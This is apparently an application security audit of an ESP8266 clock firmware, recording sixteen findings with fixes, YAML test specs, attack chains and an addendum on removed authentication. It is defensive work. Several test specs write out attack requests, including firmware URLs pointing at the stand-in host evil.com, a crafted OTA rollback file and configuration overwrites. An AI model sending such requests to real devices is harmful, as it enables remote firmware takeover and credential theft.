# Security Audit — WagFam CalClock

> **Auditor perspective:** Staff Application Security Engineer
>
> **Scope:** All source in `marquee/`, config persistence, OTA update paths, web UI,
> REST API, and external network communications.
>
> **Date:** 2026-04-26 (original audit). Status table updated 2026-05-04 for the
> auth-removal drift — see the addendum below.

## 2026-05-04 addendum: auth-removal status drift

After this audit landed, HTTP Basic Auth and CSRF token machinery were
intentionally removed from the device. Per
[`CLAUDE.md`](../CLAUDE.md#authentication): "Authentication has been intentionally
removed from the web UI and REST API. All routes are currently open (no
credentials required). The device is assumed to be on a trusted home network. A
proper authentication system should be designed and implemented in the future —
the prior HTTP Basic Auth implementation was removed because it was friction
without meaningful security on a LAN-only device."

That removal undoes the fix recorded for several findings in this audit. They
have been re-classified as **Re-introduced (accepted)** in the table below —
not because the underlying issue went away, but because under the current
trusted-LAN threat model the project has accepted the exposure as a deliberate
trade-off. If the threat model ever shifts (device exposed to a wider network,
deployed in an untrusted environment, etc.), every "Re-introduced (accepted)"
row needs to be revisited against a real auth design — the prior Basic Auth
implementation should not simply be restored.

The findings unaffected by the auth removal (SEC-02, SEC-03, SEC-06, SEC-07,
SEC-08, SEC-09, SEC-10, SEC-11, SEC-12, SEC-14, SEC-15) retain their original
status.

---

## Severity Definitions

| Severity | Meaning |
| --- | --- |
| CRITICAL | Remote code execution, full device compromise, or firmware takeover |
| HIGH | Credential exposure, unauthorized config changes, or denial of service |
| MEDIUM | Information disclosure, missing defense-in-depth, or limited-scope abuse |
| LOW | Best-practice deviation with minimal exploitability in this threat model |

---

## Finding Index

| ID | Severity | Title | Status |
| --- | --- | --- | --- |
| SEC-01 | CRITICAL | Unauthenticated firmware upload via `/update` | **Re-introduced (accepted)** — see addendum |
| SEC-02 | CRITICAL | OTA firmware fetched over plain HTTP — no transport security | Mitigated (SEC-03 fix) |
| SEC-03 | CRITICAL | Remote firmware URL injection via calendar JSON | **FIXED** |
| SEC-04 | HIGH | Web UI has zero authentication — all config routes are open | **Re-introduced (accepted)** — see addendum |
| SEC-05 | HIGH | Hardcoded, non-configurable credentials | **Re-introduced (accepted)** — see addendum |
| SEC-06 | HIGH | REST API filesystem endpoints allow unrestricted path access | **FIXED** |
| SEC-07 | HIGH | OpenWeatherMap API key sent over plain HTTP | **FIXED** |
| SEC-08 | MEDIUM | Calendar HTTPS uses `setInsecure()` — no certificate validation | Accepted risk |
| SEC-09 | MEDIUM | Config form uses GET — API keys leaked in URLs and logs | **FIXED** |
| SEC-10 | MEDIUM | No CSRF protection on any state-changing route | **Re-introduced (accepted)** — see addendum |
| SEC-11 | MEDIUM | API keys and sensitive URLs printed to Serial output | **FIXED** |
| SEC-12 | MEDIUM | No input validation on server-pushed config values | **FIXED** |
| SEC-13 | LOW | REST API Basic Auth transmitted in cleartext over HTTP | **Re-introduced (accepted)** — see addendum (no auth at all today) |
| SEC-14 | LOW | `getMessage()` has no bounds check on index parameter | **FIXED** |
| SEC-15 | LOW | NTP responses are unauthenticated — time can be spoofed | Accepted risk |
| SEC-16 | LOW | No rate limiting on authentication or state-changing endpoints | **Re-introduced (accepted)** — see addendum |

---

## SEC-01 — Unauthenticated Firmware Upload via `/update`

**Severity:** CRITICAL

**Current status:** **Re-introduced (accepted under trusted-LAN threat model).**
The fix described below was applied at the time of this audit, but Basic Auth was
later removed device-wide. Today `/update` accepts any uploader on the network. The
project accepts this exposure under the assumption that the device sits on a trusted
home LAN. If the threat model changes, design a real auth system rather than
restoring the prior Basic Auth scheme.

**What:** The ESP8266HTTPUpdateServer firmware upload endpoint at `/update` requires no
authentication. Any device on the same network can POST a `.bin` file and replace
the running firmware.

**Where:** `marquee/marquee.ino:239`

```cpp
serverUpdater.setup(&server, "/update", "", "");
```

The empty strings for username and password disable HTTP Basic Auth entirely.

**Why it happens:** The original upstream code left the update endpoint open. The comment
on line 238 says "don't require a username/password" — this was an intentional but
dangerous design choice.

**Risk:** An attacker on the local network (or any device that can reach port 80) can
upload arbitrary firmware, achieving full code execution on the ESP8266. This is the
highest-impact vulnerability in the codebase — it is a one-request full device takeover.

**Fix:** Pass real credentials to `serverUpdater.setup()`:

```cpp
serverUpdater.setup(&server, "/update", "admin", webPassword);
```

Where `webPassword` is a configurable value stored in `/conf.txt`.

**If we do nothing:** Any host on the same WiFi network can silently replace the device
firmware at any time with no user interaction required.

**Programmatic test:**

```yaml
id: SEC-01
test: "HTTP POST to /update with a valid .bin payload and NO Authorization header"
method: POST
endpoint: "/update"
auth: none
payload: "<valid firmware binary>"
expect_without_fix: 200 (upload accepted)
expect_with_fix: 401 (unauthorized)
```

---

## SEC-02 — OTA Firmware Fetched Over Plain HTTP

**Severity:** CRITICAL

**What:** All three OTA update paths (`/updateFromUrl`, auto-update, rollback) fetch
firmware binaries over plain HTTP using `WiFiClient` — not HTTPS. The only integrity
check is the MD5 hash included in the HTTP response by the hosting server, which is
also transmitted in cleartext.

**Where:**

- `marquee/marquee.ino:556` — `doOtaFlash()` uses `WiFiClient`
- `marquee/marquee.ino:570` — `handleUpdateFromUrl()` validates URL starts with `http://`
- `marquee/marquee.ino:769` — auto-update guard requires `firmwareUrl.startsWith("http://")`

```cpp
WiFiClient client;
t_httpUpdate_return ret = ESPhttpUpdate.update(client, firmwareUrl);
```

**Why it happens:** ESPhttpUpdate on ESP8266 does not support HTTPS without significant
heap cost. The code explicitly rejects HTTPS URLs as unsupported.

**Risk:** A man-in-the-middle attacker (ARP spoofing, rogue AP, compromised router) can
intercept the firmware download and replace it with malicious firmware. The MD5 check
is useless because the attacker controls the HTTP response including the MD5 header.
This is remote code execution via network position.

**Fix:** This is a platform limitation. Mitigations:

1. Add a hardcoded SHA-256 hash of expected firmware and verify after download
2. Sign firmware binaries and verify the signature before flashing
3. Use HTTPS with `WiFiClientSecure` for firmware downloads (costs ~16KB heap during update)
4. At minimum, pin the firmware host to a known IP or domain

**If we do nothing:** Anyone with a network position between the device and the firmware
host can serve malicious firmware during any OTA update.

**Programmatic test:**

```yaml
id: SEC-02
test: "Verify OTA update URL scheme"
method: GET
endpoint: "/api/config"
auth: basic admin:password
check: "response.ota_safe_url starts with 'https://'"
expect_without_fix: "starts with 'http://'"
expect_with_fix: "starts with 'https://' OR firmware signature verification enabled"
```

---

## SEC-03 — Remote Firmware URL Injection via Calendar JSON

**Severity:** CRITICAL

**What:** The calendar JSON endpoint can push a `firmwareUrl` that the device will
automatically download and flash — and the HTTPS connection to that endpoint uses
`setInsecure()` (no certificate validation). A MITM on the calendar fetch can inject
arbitrary `latestVersion` + `firmwareUrl` values, triggering an automatic firmware
replacement.

**Where:**

- `marquee/WagFamBdayClient.cpp:44` — `client->setInsecure()`
- `marquee/WagFamBdayClient.cpp:168-170` — `firmwareUrl` parsed from JSON
- `marquee/marquee.ino:767-773` — auto-update triggered when version differs

**Why it happens:** BearSSL `setInsecure()` disables all certificate checks. The
calendar JSON is trusted implicitly — any `firmwareUrl` value it contains is flashed
without user confirmation.

**Risk:** Chain: MITM the calendar HTTPS fetch -> inject `firmwareUrl` pointing to
attacker-controlled HTTP server -> device auto-flashes attacker firmware -> full RCE.
This requires no authentication and no user interaction. The attack window is every
`minutesBetweenDataRefresh` minutes (default: 15).

**Fix:**

1. Pin the calendar server's certificate fingerprint or use a CA bundle
2. Validate `firmwareUrl` against an allowlist of trusted domains
3. Require user confirmation before auto-flashing (e.g., scroll a message and wait for
   physical button press)
4. At minimum, only allow firmware URLs from the same domain as `WAGFAM_DATA_URL`

**If we do nothing:** An attacker on the network path between the device and the
calendar server can achieve remote code execution every 15 minutes with zero interaction.

**Programmatic test:**

```yaml
id: SEC-03
test: "Calendar JSON with firmwareUrl from untrusted domain triggers auto-update"
method: POST
endpoint: "/api/fs/write"
auth: basic admin:password
payload: |
  {
    "path": "/test_calendar.json",
    "content": "[{\"config\":{\"latestVersion\":\"9.9.9\",\"firmwareUrl\":\"http://evil.com/backdoor.bin\"}}]"
  }
check: "firmwareUrl domain is validated against allowlist before flashing"
expect_without_fix: "device attempts to flash from arbitrary URL"
expect_with_fix: "device rejects firmwareUrl from untrusted domain"
```

---

## SEC-04 — Web UI Has Zero Authentication

**Severity:** HIGH

**Current status:** **Re-introduced (accepted under trusted-LAN threat model).**
Basic Auth was added during the original fix for this finding, then removed
device-wide. Today the SPA, the legacy redirects, and every state-changing
endpoint are open to anyone who can reach port 80. The exposure is identical to
the original finding (now via SPA + REST API rather than `/configure` + `/saveconfig`),
accepted on the trusted-LAN assumption. Reopen if/when the device is exposed to
a wider network.

**What:** The web UI routes `/configure`, `/saveconfig`, `/systemreset`, `/forgetwifi`,
and `/pull` require no authentication. Anyone who can reach port 80 can read all config
(including API keys), change any setting, factory-reset the device, or wipe WiFi
credentials.

**Where:** `marquee/marquee.ino:244-250` — route registration with no auth middleware

```cpp
server.on("/", displayHomePage);
server.on("/pull", handlePull);
server.on("/systemreset", handleSystemReset);
server.on("/forgetwifi", handleForgetWifi);
server.on("/configure", handleConfigure);
server.on("/saveconfig", handleSaveConfig);
```

None of these handlers call `server.authenticate()`.

**Why it happens:** The upstream project assumed the device is on a trusted home network.
No authentication was ever added to the web UI.

**Risk:**

- **Credential theft:** `/configure` renders API keys in form `value=` attributes
- **Config tampering:** `/saveconfig` accepts any values via GET parameters
- **Denial of service:** `/systemreset` deletes config and reboots;
  `/forgetwifi` bricks the device until physical access
- **Data exfiltration:** `/` displays calendar messages and weather data

**Fix:** Add `server.authenticate("admin", webPassword)` checks to all handlers,
or create a middleware wrapper. At minimum, protect `/configure`, `/saveconfig`,
`/systemreset`, `/forgetwifi`, and `/update`.

**If we do nothing:** Any device on the network can read API keys, change all settings,
or brick the device.

**Programmatic test:**

```yaml
id: SEC-04
test: "Access /configure with no credentials"
method: GET
endpoint: "/configure"
auth: none
expect_without_fix: 200 (full config page with API keys rendered)
expect_with_fix: 401 (unauthorized)
---
id: SEC-04b
test: "POST /saveconfig with no credentials"
method: GET
endpoint: "/saveconfig?wagFamDataSource=http://evil.com&openWeatherMapApiKey=stolen"
auth: none
expect_without_fix: 302 (config saved and redirect)
expect_with_fix: 401 (unauthorized)
---
id: SEC-04c
test: "Access /systemreset with no credentials"
method: GET
endpoint: "/systemreset"
auth: none
expect_without_fix: "device resets and reboots"
expect_with_fix: 401 (unauthorized)
---
id: SEC-04d
test: "Access /forgetwifi with no credentials"
method: GET
endpoint: "/forgetwifi"
auth: none
expect_without_fix: "WiFi credentials wiped, device enters AP mode"
expect_with_fix: 401 (unauthorized)
```

---

## SEC-05 — Hardcoded, Non-configurable Credentials

**Severity:** HIGH

**Current status:** **Re-introduced (accepted under trusted-LAN threat model).**
The original fix added a per-device random password configurable from the web UI;
that scheme was removed along with the rest of the auth system. Today there are
no credentials at all — every endpoint is open. This is materially different from
the original finding (no shared compiled-in default to leak), but the practical
exposure is the same: full API access without authentication. Accepted on the
trusted-LAN assumption.

**What:** The REST API uses hardcoded credentials `admin` / `password` that cannot be
changed by the user. These credentials are compiled into the firmware.

**Where:** `marquee/marquee.ino:1193`

```cpp
if (!server.authenticate("admin", "password")) {
```

And the firmware upload endpoint (if auth were enabled) would use the same pattern.

**Why it happens:** The REST API was added with placeholder credentials and no mechanism
to configure them via the web UI or `/conf.txt`.

**Risk:** Every deployed device uses the same credentials. Anyone who reads the source
code (public GitHub repo) knows the credentials for every device. Combined with SEC-04,
an attacker on the network has full API access.

**Fix:**

1. Add a `WEB_PASSWORD` key to `/conf.txt` with a random default generated on first boot
2. Add a password-change field to the `/configure` form
3. Use the stored password in all `server.authenticate()` calls

**If we do nothing:** All devices share the same publicly-known credentials forever.

**Programmatic test:**

```yaml
id: SEC-05
test: "REST API accepts default hardcoded credentials"
method: GET
endpoint: "/api/status"
auth: basic admin:password
expect_without_fix: 200 (access granted with default credentials)
expect_with_fix: "401 if user has changed password, 200 only with user-set password"
---
id: SEC-05b
test: "Config includes a web_password field"
method: GET
endpoint: "/api/config"
auth: basic admin:<user-set-password>
check: "response contains 'web_password' or password is stored in /conf.txt"
expect_without_fix: "no password field exists in config"
expect_with_fix: "password field exists and is configurable"
```

---

## SEC-06 — REST API Filesystem Endpoints Allow Unrestricted Path Access

**Severity:** HIGH

**What:** The `/api/fs/read`, `/api/fs/write`, and `/api/fs/delete` endpoints accept
any LittleFS path with no restrictions. An authenticated API user can overwrite
`/conf.txt` (corrupting config), write a fake `/ota_pending.txt` (forcing a rollback
to an attacker-controlled URL), or delete any file.

**Where:**

- `marquee/marquee.ino:1344-1365` — `handleApiFsRead()` / `handleApiFsWrite()`
- `marquee/marquee.ino:1390-1398` — `handleApiFsDelete()`

**Why it happens:** The filesystem API was designed for testing and intentionally
provides raw access. No path allowlist or blocklist is enforced.

**Risk:**

- Write a crafted `/ota_pending.txt` with `safeUrl=http://evil.com/backdoor.bin` and
  `boots=1`, then trigger a restart via `/api/restart`. On next boot,
  `checkOtaRollback()` sees `boots >= 2` and flashes the attacker's firmware.
  **This chains SEC-06 + authenticated API access into remote code execution.**
- Overwrite `/conf.txt` with attacker-controlled config values
- Delete `/conf.txt` to reset the device to defaults

**Fix:**

1. Blocklist critical files: reject writes to `/conf.txt` and `/ota_pending.txt` via
   the filesystem API (force config changes through `/api/config`)
2. Or allowlist: only permit paths under a `/test/` prefix
3. Add a `X-Dangerous: true` header requirement for write/delete operations as an
   explicit opt-in

**If we do nothing:** An authenticated API user (with the hardcoded creds from SEC-05)
can achieve RCE by writing a crafted OTA pending file and triggering a restart.

**Programmatic test:**

```yaml
id: SEC-06a
test: "Write to /ota_pending.txt via filesystem API"
method: POST
endpoint: "/api/fs/write"
auth: basic admin:password
payload: |
  {"path": "/ota_pending.txt", "content": "safeUrl=http://evil.com/rce.bin\nnewUrl=x\nboots=1\n"}
expect_without_fix: 200 (file written)
expect_with_fix: 403 (forbidden — protected path)
---
id: SEC-06b
test: "Overwrite /conf.txt via filesystem API"
method: POST
endpoint: "/api/fs/write"
auth: basic admin:password
payload: |
  {"path": "/conf.txt", "content": "APIKEY=stolen\nWAGFAM_DATA_URL=http://evil.com\n"}
expect_without_fix: 200 (file written)
expect_with_fix: 403 (forbidden — use /api/config instead)
---
id: SEC-06c
test: "Delete /conf.txt via filesystem API"
method: DELETE
endpoint: "/api/fs/delete?path=/conf.txt"
auth: basic admin:password
expect_without_fix: 200 (file deleted)
expect_with_fix: 403 (forbidden — protected path)
```

---

## SEC-07 — OpenWeatherMap API Key Sent Over Plain HTTP

**Severity:** HIGH

**What:** The weather client connects to `api.openweathermap.org` on port 80 (plain
HTTP) and includes the API key directly in the URL query string.

**Where:** `marquee/OpenWeatherMapClient.cpp:127-131`

```cpp
apiGetData += F("&units=") + ... + F("&APPID=") + myApiKey + F(" HTTP/1.1");
// ...
if (weatherClient.connect(servername, 80)) {
```

**Why it happens:** The upstream code used plain HTTP for simplicity. OWM does support
HTTPS, but switching requires `WiFiClientSecure` and additional heap.

**Risk:** The OWM API key is transmitted in cleartext on every weather refresh (default:
every 15 minutes). Any network observer can capture it. A stolen API key can be used
to exhaust the user's OWM API quota or be used for other OWM abuse.

**Fix:** Switch to HTTPS by using `WiFiClientSecure` with `setInsecure()` (or better,
with OWM's certificate fingerprint). OWM supports HTTPS on the same endpoints.

**If we do nothing:** The API key is exposed in plaintext on every request, ~96 times
per day.

**Programmatic test:**

```yaml
id: SEC-07
test: "Weather client uses HTTPS"
check: "OpenWeatherMapClient.cpp connects on port 443 using WiFiClientSecure"
grep_pattern: "weatherClient.connect(servername, 80)"
expect_without_fix: "match found (plain HTTP)"
expect_with_fix: "no match (uses port 443 with TLS)"
```

---

## SEC-08 — Calendar HTTPS Uses `setInsecure()` — No Certificate Validation

**Severity:** MEDIUM

**What:** The BearSSL HTTPS client used to fetch calendar data disables all certificate
verification, making the TLS connection vulnerable to man-in-the-middle attacks.

**Where:** `marquee/WagFamBdayClient.cpp:44`

```cpp
client->setInsecure();
```

**Why it happens:** Certificate pinning or CA validation requires either a hardcoded
fingerprint (breaks on cert rotation) or a CA bundle (uses significant flash/RAM).
`setInsecure()` was chosen as a pragmatic tradeoff for embedded use.

**Risk:** An attacker with network position can intercept the calendar HTTPS connection
and inject arbitrary JSON — including malicious config values (`dataSourceUrl`,
`apiKey`, `firmwareUrl`). This is the enabler for SEC-03.

**Fix:**

1. Pin the server certificate fingerprint (requires updating on cert renewal)
2. Use `setTrustAnchors()` with a minimal CA bundle for the calendar host
3. If the calendar host uses Let's Encrypt, pin the ISRG Root X1 CA

**If we do nothing:** TLS provides no authentication — only encryption against passive
eavesdroppers. Active MITM is trivial.

**Programmatic test:**

```yaml
id: SEC-08
test: "Calendar client validates server certificate"
grep_pattern: "setInsecure()"
file: "marquee/WagFamBdayClient.cpp"
expect_without_fix: "match found"
expect_with_fix: "no match — uses setTrustAnchors() or setFingerprint()"
```

---

## SEC-09 — Config Form Uses GET — API Keys Leaked in URLs

**Severity:** MEDIUM

**What:** The configuration form submits via `method='get'`, which puts all form values
— including API keys — into the URL query string. These appear in browser history,
browser address bar, any proxy or router logs, and the `Referer` header on subsequent
navigation.

**Where:** `marquee/marquee.ino:118`

```cpp
static const char CHANGE_FORM1[] PROGMEM = "<form class='w3-container' action='/saveconfig' method='get'>"
```

**Why it happens:** Original upstream code used GET for simplicity.
`ESP8266WebServer::arg()` works identically for GET and POST.

**Risk:** API keys (OWM, WagFam) are exposed in URL history and any intermediate logging.
On a shared browser this is direct credential exposure.

**Fix:** Change `method='get'` to `method='post'`. No server-side changes needed —
`server.arg()` handles both transparently.

**If we do nothing:** API keys persist in browser history and potentially in network
logs of any proxy between the browser and the device.

**Programmatic test:**

```yaml
id: SEC-09
test: "Config form uses POST method"
grep_pattern: "method='get'"
file: "marquee/marquee.ino"
context: "CHANGE_FORM"
expect_without_fix: "match found"
expect_with_fix: "no match — uses method='post'"
```

---

## SEC-10 — No CSRF Protection on State-Changing Routes

**Severity:** MEDIUM

**Current status:** **Re-introduced (accepted under trusted-LAN threat model).**
The CSRF token machinery + `X-Requested-With` header check were removed along
with the rest of the auth system. State-changing endpoints can again be triggered
by drive-by requests from another origin if the user visits a malicious page on
the same network. Accepted on the trusted-LAN assumption; revisit when the auth
story is redesigned. (Not in the original list of items the maintainer flagged
for re-opening — included here for accuracy because the original FIXED status
no longer holds.)

**What:** None of the state-changing endpoints (`/saveconfig`, `/systemreset`,
`/forgetwifi`, `/updateFromUrl`, `/api/*` POST endpoints) use CSRF tokens. A malicious
web page visited by a user on the same network can trigger these actions.

**Where:** All route handlers in `marquee/marquee.ino`

**Why it happens:** CSRF protection was never implemented. The device has no session
management or token generation.

**Risk:** If a user on the same network visits a malicious page (or a page with
injected JavaScript), that page can:

- Submit the config form to change settings
- Trigger `/systemreset` or `/forgetwifi` to DoS the device
- Call REST API endpoints (with the known default credentials via XHR)

**Fix:**

1. Generate a random CSRF token on boot, store in RAM
2. Include it as a hidden field in all forms
3. Validate it on all state-changing GET/POST handlers
4. For the REST API, require a custom header (e.g., `X-Requested-With: XMLHttpRequest`)
   — browsers block custom headers in cross-origin requests by default

**If we do nothing:** Drive-by attacks from malicious web pages can reconfigure or
brick the device.

**Programmatic test:**

```yaml
id: SEC-10
test: "State-changing request without CSRF token is rejected"
method: GET
endpoint: "/saveconfig?wagFamDataSource=http://evil.com"
headers:
  Origin: "http://evil.com"
auth: none
expect_without_fix: 302 (config saved)
expect_with_fix: 403 (CSRF validation failed)
---
id: SEC-10b
test: "REST API requires custom header for CSRF protection"
method: POST
endpoint: "/api/restart"
auth: basic admin:password
headers: {}
expect_without_fix: 200 (restart triggered)
expect_with_fix: "403 unless X-Requested-With header present"
```

---

## SEC-11 — API Keys and Sensitive URLs Printed to Serial

**Severity:** MEDIUM

**What:** Multiple locations print API keys, calendar URLs, and firmware URLs to the
serial console in plaintext.

**Where:**

- `marquee/WagFamBdayClient.cpp:52` — `Serial.println(myJsonSourceUrl)` (may contain
  embedded API key in URL)
- `marquee/marquee.ino:980` — `WAGFAM_DATA_URL` printed during config read
- `marquee/OpenWeatherMapClient.cpp:129` — full API GET string including `APPID=` key
- `marquee/marquee.ino:762` — firmware URL printed
- `marquee/marquee.ino:1017-1018` — API key presence logged

**Why it happens:** Debug logging was left in from development.

**Risk:** Anyone with physical access to the USB serial port can read API keys. In a
shared lab or workshop environment, this is credential exposure. Serial output may also
be captured by monitoring tools.

**Fix:** Replace key values with redacted versions in log output:

```cpp
Serial.println("APIKEY: [set]");  // already done in readPersistentConfig
// But NOT done in OpenWeatherMapClient.cpp:129 where the full URL is printed
```

**If we do nothing:** Credentials are continuously emitted on the serial port.

**Programmatic test:**

```yaml
id: SEC-11
test: "Serial output does not contain raw API key values"
grep_pattern: "Serial\\.println\\(apiGetData\\)|Serial\\.println\\(myJsonSourceUrl\\)"
expect_without_fix: "matches found — raw URLs with keys printed"
expect_with_fix: "no matches — keys redacted in serial output"
```

---

## SEC-12 — No Input Validation on Server-Pushed Config Values

**Severity:** MEDIUM

**What:** Config values pushed by the calendar JSON (`dataSourceUrl`, `apiKey`,
`firmwareUrl`) are accepted and persisted without any validation. A compromised or
spoofed calendar server can redirect the device to fetch data from an
attacker-controlled URL, change the API key to lock out the real owner, or point
firmware updates at a malicious binary.

**Where:** `marquee/marquee.ino:745-764`

```cpp
if (serverConfig.dataSourceUrlValid) {
    WAGFAM_DATA_URL = serverConfig.dataSourceUrl;  // no validation
    // ...
}
```

And `marquee/WagFamBdayClient.cpp:156-170` — all config values stored as-is.

**Why it happens:** The calendar server is implicitly trusted.

**Risk:**

- `dataSourceUrl` redirect: device now fetches calendar data from attacker, enabling
  persistent control even after the original MITM ends
- `apiKey` override: locks out the legitimate owner's API key
- `firmwareUrl` injection: triggers firmware replacement (SEC-03)

**Fix:**

1. Validate `dataSourceUrl` starts with `https://` and matches a domain allowlist
2. Validate `firmwareUrl` against a trusted domain allowlist
3. Require a confirmation mechanism before applying server-pushed config changes
4. Log config changes prominently (already partially done)

**If we do nothing:** A single MITM or compromised calendar server gives the attacker
persistent control over the device's data source, credentials, and firmware.

**Programmatic test:**

```yaml
id: SEC-12
test: "Calendar config rejects dataSourceUrl to untrusted domain"
setup: "Feed device JSON with dataSourceUrl pointing to http://evil.com"
check: "WAGFAM_DATA_URL was NOT updated to the untrusted URL"
expect_without_fix: "WAGFAM_DATA_URL changed to http://evil.com"
expect_with_fix: "WAGFAM_DATA_URL unchanged — untrusted domain rejected"
---
id: SEC-12b
test: "Calendar config rejects firmwareUrl to untrusted domain"
setup: "Feed device JSON with firmwareUrl=http://evil.com/backdoor.bin"
check: "performAutoUpdate() was NOT called"
expect_without_fix: "device attempts to flash from evil.com"
expect_with_fix: "firmware URL rejected — untrusted domain"
```

---

## SEC-13 — REST API Basic Auth Transmitted in Cleartext

**Severity:** LOW

**Current status:** **Re-introduced (accepted under trusted-LAN threat model).**
The original "Accepted risk" disposition was based on Basic Auth being in use over
plain HTTP — a known limitation of the platform. Today there is no auth at all,
which makes the original cleartext-credentials concern moot but introduces the
broader "no auth on any endpoint" exposure (see SEC-04 / SEC-05). Net practical
risk is unchanged: no client-supplied secret is being exfiltrated, but every
endpoint is still open to anyone on the LAN. Revisit alongside SEC-04 if/when
auth is reintroduced.

**What:** The REST API uses HTTP Basic Auth over plain HTTP (port 80). The
base64-encoded `admin:password` header is trivially decoded by any network observer.

**Where:** `marquee/marquee.ino:1192-1198` — `requireApiAuth()` uses
`server.authenticate()` over unencrypted HTTP.

**Why it happens:** The ESP8266 web server runs on plain HTTP. Adding TLS to the web
server itself would require significant heap and CPU resources.

**Risk:** On an untrusted network, the credentials are visible to any packet sniffer.
Combined with SEC-05 (hardcoded creds), this is low additional risk since the creds
are already publicly known. Becomes more important if SEC-05 is fixed.

**Fix:** Not practically fixable on ESP8266 without significant resource cost. Accept
as a known limitation of the platform. Mitigate by ensuring the device is only
accessible from a trusted network segment.

**If we do nothing:** Credentials are visible in plaintext on the network. Acceptable
for a trusted home network; unacceptable if the device were exposed to the internet.

**Programmatic test:**

```yaml
id: SEC-13
test: "Web server uses HTTPS"
check: "ESP8266WebServer listens on TLS"
expect_without_fix: "plain HTTP on port 80"
expect_with_fix: "accepted risk — document in threat model"
```

---

## SEC-14 — `getMessage()` Has No Bounds Check

**Severity:** LOW

**What:** `WagFamBdayClient::getMessage(int index)` returns `messages[index]` without
checking that `index` is within `[0, messageCounter)`. An out-of-bounds read returns
an empty `String` (the array is fixed at 10), but a negative or very large index is
undefined behavior.

**Where:** `marquee/WagFamBdayClient.cpp:104-106`

```cpp
String WagFamBdayClient::getMessage(int index) {
  return messages[index];  // no bounds check
}
```

**Why it happens:** The caller (`processEveryMinute()`) wraps the index modulo
`getNumMessages()`, so in normal operation this is never triggered. But the function
is public and could be called from the REST API or future code.

**Risk:** Minimal in current code. Could cause a crash if called with a bad index from
new code paths. The array is stack/heap allocated with a fixed size of 10, so the
worst case is reading adjacent memory (information leak, not RCE on ESP8266).

**Fix:**

```cpp
String WagFamBdayClient::getMessage(int index) {
  if (index < 0 || index >= messageCounter) return String();
  return messages[index];
}
```

**If we do nothing:** No current exploit path, but a latent bug for future code.

**Programmatic test:**

```yaml
id: SEC-14
test: "getMessage() with out-of-bounds index returns empty string safely"
type: unit_test
code: |
  WagFamBdayClient client("", "");
  TEST_ASSERT_EQUAL_STRING("", client.getMessage(-1).c_str());
  TEST_ASSERT_EQUAL_STRING("", client.getMessage(10).c_str());
  TEST_ASSERT_EQUAL_STRING("", client.getMessage(99).c_str());
expect_without_fix: "undefined behavior / potential crash"
expect_with_fix: "returns empty string for all invalid indices"
```

---

## SEC-15 — NTP Responses Are Unauthenticated

**Severity:** LOW

**What:** NTP time synchronization uses plain UDP with no authentication (NTS). An
attacker who can spoof UDP packets from the NTP server can set the device clock to
an arbitrary time.

**Where:** `marquee/timeNTP.cpp:72-106` — `getNtpTime()` trusts any response from
the expected IP.

**Why it happens:** Standard NTP is unauthenticated. NTS (Network Time Security) is
not supported by the ESP8266 NTP libraries.

**Risk:** Time spoofing could:

- Make the OTA confirmation timer (`OTA_CONFIRM_MS`) fire prematurely or never
- Display incorrect time on the clock
- Affect weather refresh scheduling

Impact is low because `millis()` (used for the OTA timer) is independent of NTP.

**Fix:** Accept as a platform limitation. NTS is not feasible on ESP8266. Mitigate by
using multiple NTP servers and rejecting large time jumps.

**If we do nothing:** An attacker with UDP spoofing capability can set the clock to
wrong time. Low practical impact.

**Programmatic test:**

```yaml
id: SEC-15
test: "NTP uses authenticated time source"
grep_pattern: "ntpServerName"
expect_without_fix: "uses pool.ntp.org with no authentication"
expect_with_fix: "accepted risk — document in threat model"
```

---

## SEC-16 — No Rate Limiting on Authentication or State-Changing Endpoints

**Severity:** LOW

**Current status:** **Re-introduced (accepted under trusted-LAN threat model).**
The original FIXED disposition referenced rate limiting added alongside the auth
work; that infrastructure was removed with the auth removal. There is again no
rate limiting on any endpoint — `/api/restart` (now unauthenticated) can be
hammered to keep the device in a reboot loop. Accepted on the trusted-LAN
assumption.

**What:** There is no rate limiting on any endpoint. The REST API auth can be
brute-forced at network speed. State-changing endpoints (`/systemreset`, `/api/restart`)
can be called repeatedly to keep the device in a reboot loop.

**Where:** All route handlers — no rate limiting infrastructure exists.

**Why it happens:** ESP8266WebServer has no built-in rate limiting. Implementing it
requires tracking request timestamps per client IP.

**Risk:** Low for brute-force (SEC-05 makes creds publicly known anyway). Medium for
DoS via repeated `/api/restart` calls — an attacker can keep the device perpetually
rebooting.

**Fix:**

1. Add a per-IP request counter with a sliding window (e.g., max 10 auth failures per
   minute)
2. Add a cooldown after `/api/restart` (ignore restart requests within 60s of last restart)
3. Track failed auth attempts and temporarily block the source IP

**If we do nothing:** An attacker on the network can keep the device in a reboot loop
indefinitely.

**Programmatic test:**

```yaml
id: SEC-16
test: "Repeated restart requests are rate-limited"
method: POST
endpoint: "/api/restart"
auth: basic admin:password
repeat: 10
interval: "100ms"
expect_without_fix: "all 10 requests accepted, device reboots 10 times"
expect_with_fix: "first request accepted, subsequent requests return 429 (too many requests)"
```

---

## Attack Chain Summary

The most dangerous chain combines multiple findings:

```text
SEC-08 (no cert validation) + SEC-03 (firmware URL injection) + SEC-02 (HTTP firmware)
= Remote code execution via MITM with zero user interaction

SEC-05 (known creds) + SEC-06 (fs write) + API restart
= Remote code execution via crafted ota_pending.txt

SEC-04 (no web auth) + SEC-01 (no upload auth)
= Remote code execution via direct firmware upload from LAN

SEC-04 (no web auth) + SEC-09 (GET form)
= Credential theft via browser history or network logs
```

---

## Recommended Fix Priority

The priority table below is the original audit's recommendation. With the 2026-05-04
auth removal, SEC-01, SEC-04, SEC-05, SEC-10, SEC-13, and SEC-16 are again live
exposures — the project has accepted them under a trusted-LAN threat model rather
than re-prioritised them for fixing. Treat the priorities below as the correct
priorities **if** the threat model shifts.

| Priority | Findings | Rationale |
| --- | --- | --- |
| P0 — Fix immediately | SEC-01, SEC-04 | One-request unauthenticated device takeover from LAN |
| P1 — Fix before next release | SEC-05, SEC-06, SEC-09 | Known creds + unrestricted fs = RCE chain |
| P2 — Fix in near term | SEC-03, SEC-12, SEC-10 | Server-pushed config needs guardrails |
| P3 — Track and mitigate | SEC-02, SEC-07, SEC-08, SEC-11 | Platform limitations; mitigate where feasible |
| P4 — Accept with documentation | SEC-13, SEC-14, SEC-15, SEC-16 | Low risk or infeasible to fix on ESP8266 |
